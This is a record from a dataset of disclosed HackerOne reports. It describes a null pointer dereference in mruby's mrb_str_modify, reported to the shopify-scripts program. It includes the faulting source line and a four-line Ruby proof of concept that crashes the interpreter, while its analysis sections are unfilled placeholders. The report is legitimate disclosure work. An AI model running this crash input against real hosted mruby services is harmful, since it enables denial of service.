---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '197723'
original_report_id: '197723'
title: Null pointer dereference in mrb_str_modify
weakness: Uncontrolled Resource Consumption
team_handle: shopify-scripts
created_at: '2017-01-12T05:30:25.949Z'
disclosed_at: '2017-02-07T06:28:59.625Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Null pointer dereference in mrb_str_modify

## Metadata

- HackerOne Report ID: 197723
- Weakness: Uncontrolled Resource Consumption
- Program: shopify-scripts
- Disclosed At: 2017-02-07T06:28:59.625Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The function  mrb_str_modify doesn't check if s->as.heap.ptr is NULL before operating in it.

Attempt to write to a NULL pointer happens here:
```
676	      RSTR_PTR(s)[s->as.heap.len] = '\0';
```

Poc:
```ruby
a = String.new
a[0]
GC.start()
a.upcase!
```

Version tested: https://github.com/mruby/mruby/blob/e1ff71029f95e3274136263adbdc51c662ec52de/src/string.c

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
